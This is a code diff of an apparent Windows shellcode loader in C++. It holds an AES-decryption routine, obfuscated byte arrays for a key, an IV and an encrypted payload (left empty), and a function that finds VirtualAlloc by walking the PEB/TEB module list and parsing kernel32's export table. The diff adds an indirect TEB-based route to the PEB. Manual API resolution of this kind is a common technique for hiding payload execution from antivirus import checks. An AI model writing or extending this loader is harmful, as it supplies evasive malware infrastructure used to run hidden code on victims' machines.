@@ -7,7 +7,6 @@ unsigned char ke185hams[] = {};
 unsigned char AESiv[] = {};
     
 unsigned char itsthecod345[] = {};
-
     
     
 void aesdecrypt(char* data, DWORD dataLen, char* key, DWORD keyLen, char* iv, DWORD ivLen) {
@@ -61,60 +60,89 @@ typedef struct _PEB {
     PPEB_LDR_DATA Ldr;
 } PEB, *PPEB;
 
+#ifdef _M_X64
+    typedef struct _TEB {
+        ULONG64 Reserved1[12];
+        PPEB ProcessEnvironmentBlock; // This points to the PEB
+        // Other members are omitted for brevity
+    } TEB, *PTEB;
+#endif
+
+
+
+
+
 typedef LPVOID(WINAPI* fnVirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD);
 
 typedef void* (*cool)(void*, size_t);
 
+
+
+
+
+
+
 cool Getaddress(const char * vv) {
 #ifdef _M_X64
-    PPEB peb = (PPEB)__readgsqword(0x60); // Get PEB on x64
+    PPEB peb = (PPEB)__readgsqword(0x60); // Get PEB on x64 via GS register
 #else
-    PPEB peb = (PPEB)__readfsdword(0x30); // Get PEB on x86
+    PPEB peb = (PPEB)__readfsdword(0x30); // Get PEB on x86 via FS register
 #endif
 
-    PPEB_LDR_DATA ldr = peb->Ldr;
-    LIST_ENTRY* moduleList = &ldr->InLoadOrderModuleList;
-    LIST_ENTRY* entry = moduleList->Flink;
+// Get TEB from thread context (TEB is at FS or GS base)
+PTEB teb;
+#ifdef _M_X64
+    teb = (PTEB)__readgsqword(0x30); // Access TEB for x64
+#else
+    teb = (PTEB)__readfsdword(0x18); // Access TEB for x86
+#endif
 
-    while (entry != moduleList) {
-        PLDR_DATA_TABLE_ENTRY module = (PLDR_DATA_TABLE_ENTRY)entry;
-        entry = entry->Flink;  // Move to next module
+// Now get the PEB from the TEB
+peb = teb->ProcessEnvironmentBlock;  // This is the indirect way to access the PEB
 
-        if (!module->BaseDllName.Buffer) continue;
+// Access LDR from PEB
+PPEB_LDR_DATA ldr = peb->Ldr;
+LIST_ENTRY* moduleList = &ldr->InLoadOrderModuleList;
+LIST_ENTRY* entry = moduleList->Flink;
 
-        // Print module name for debugging
-        wprintf(L"Loaded Module: %s\n", module->BaseDllName.Buffer);
+while (entry != moduleList) {
+    PLDR_DATA_TABLE_ENTRY module = (PLDR_DATA_TABLE_ENTRY)entry;
+    entry = entry->Flink;  // Move to next module
 
-        if (_wcsicmp(module->BaseDllName.Buffer, L"KERNEL32.DLL") == 0) {
-            BYTE* baseAddress = (BYTE*)module->DllBase;
+    if (!module->BaseDllName.Buffer) continue;
 
-            IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)baseAddress;
-            IMAGE_NT_HEADERS* ntHeaders = (IMAGE_NT_HEADERS*)(baseAddress + dosHeader->e_lfanew);
-            IMAGE_DATA_DIRECTORY exportDir = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
+    // Print module name for debugging
+    wprintf(L"Loaded Module: %s\n", module->BaseDllName.Buffer);
 
-            if (exportDir.VirtualAddress == 0) return nullptr;  // No export table found
+    if (_wcsicmp(module->BaseDllName.Buffer, L"KERNEL32.DLL") == 0) {
+        BYTE* baseAddress = (BYTE*)module->DllBase;
 
-            IMAGE_EXPORT_DIRECTORY* exportTable = (IMAGE_EXPORT_DIRECTORY*)(baseAddress + exportDir.VirtualAddress);
-            DWORD* nameArray = (DWORD*)(baseAddress + exportTable->AddressOfNames);
-            WORD* ordinalArray = (WORD*)(baseAddress + exportTable->AddressOfNameOrdinals);
-            DWORD* funcArray = (DWORD*)(baseAddress + exportTable->AddressOfFunctions);
+        IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)baseAddress;
+        IMAGE_NT_HEADERS* ntHeaders = (IMAGE_NT_HEADERS*)(baseAddress + dosHeader->e_lfanew);
+        IMAGE_DATA_DIRECTORY exportDir = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
 
-            for (DWORD i = 0; i < exportTable->NumberOfNames; i++) {
-                char* functionName = (char*)(baseAddress + nameArray[i]);
+        if (exportDir.VirtualAddress == 0) return nullptr;  // No export table found
 
-                // Print function name for debugging
-                std::cout << "Exported Function: " << functionName << std::endl;
+        IMAGE_EXPORT_DIRECTORY* exportTable = (IMAGE_EXPORT_DIRECTORY*)(baseAddress + exportDir.VirtualAddress);
+        DWORD* nameArray = (DWORD*)(baseAddress + exportTable->AddressOfNames);
+        WORD* ordinalArray = (WORD*)(baseAddress + exportTable->AddressOfNameOrdinals);
+        DWORD* funcArray = (DWORD*)(baseAddress + exportTable->AddressOfFunctions);
 
-                if (strcmp(functionName, vv) == 0) {
-                    DWORD funcRVA = funcArray[ordinalArray[i]];
-                    void* funadd = (void*)(baseAddress + funcRVA);
-                    std::cout<<functionName <<"found at: "<< funadd<<std::endl;
-                    return (fnVirtualAlloc)(baseAddress + funcRVA);
-                }
+        for (DWORD i = 0; i < exportTable->NumberOfNames; i++) {
+            char* functionName = (char*)(baseAddress + nameArray[i]);
+            // Print function name for debugging
+            std::cout << "Exported Function: " << functionName << std::endl;
+
+            if (strcmp(functionName, vv) == 0) {
+                DWORD funcRVA = funcArray[ordinalArray[i]];
+                void* funadd = (void*)(baseAddress + funcRVA);
+                std::cout << "VirtualAlloc found at address: " << funadd << std::endl;
+                return (fnVirtualAlloc)(baseAddress + funcRVA);
             }
         }
     }
-    return nullptr;
+}
+return nullptr;
 }
 
 int main() {
